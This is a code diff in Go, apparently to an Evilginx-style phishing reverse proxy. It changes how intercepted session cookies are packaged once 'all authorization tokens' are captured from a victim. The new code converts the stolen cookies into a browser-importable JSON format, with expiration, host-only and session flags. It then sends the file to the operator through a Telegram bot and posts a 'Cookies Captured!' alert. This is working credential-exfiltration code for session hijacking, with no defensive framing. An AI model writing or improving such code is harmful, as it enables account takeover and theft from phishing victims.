@@ -107,6 +107,18 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
+type CookieJSON struct {
+    Path            string  `json:"path"`
+    Domain          string  `json:"domain"`
+    ExpirationDate  int64   `json:"expirationDate,omitempty"`
+    Value           string  `json:"value"`
+    Name            string  `json:"name"`
+    HttpOnly        bool    `json:"httpOnly"`
+    HostOnly        bool    `json:"hostOnly"`
+    Secure          bool    `json:"secure"`
+    Session         bool    `json:"session"`
+}
+
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
@@ -1086,17 +1098,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-						// Create cookies.txt content
-						var cookieContent strings.Builder
+						// Create cookies.json content
+						var cookiesList []CookieJSON
 						for domain, cookies := range s.CookieTokens {
 							for name, cookie := range cookies {
-								cookieContent.WriteString(fmt.Sprintf("Domain: %s\nName: %s\nValue: %s\nPath: %s\nHttpOnly: %v\n\n",
-									domain, name, cookie.Value, cookie.Path, cookie.HttpOnly))
+								// Calculate expirationDate in Unix timestamp
+								var expirationDate int64
+								if !cookie.Expires.IsZero() {
+									expirationDate = cookie.Expires.Unix()
+								}
+								
+								cookieJSON := CookieJSON{
+									Path:           cookie.Path,
+									Domain:         domain,
+									ExpirationDate: expirationDate,
+									Value:          cookie.Value,
+									Name:           name,
+									HttpOnly:       cookie.HttpOnly,
+									HostOnly:       cookie.Domain == domain,
+									Secure:         cookie.Secure,
+									Session:        cookie.Expires.IsZero(),
+								}
+								cookiesList = append(cookiesList, cookieJSON)
 							}
 						}
-
-						// Send cookies file
-						p.telegram.SendFile("cookies.txt", cookieContent.String())
+						
+						// Convert to JSON
+						jsonData, err := json.MarshalIndent(cookiesList, "", "    ")
+						if err != nil {
+							log.Error("Failed to marshal cookies to JSON: %v", err)
+							return
+						}
+						
+						// Send JSON file
+						p.telegram.SendFile("cookies.json", string(jsonData))
 
 						message := fmt.Sprintf(`🍪 <b>Cookies Captured!</b>
 
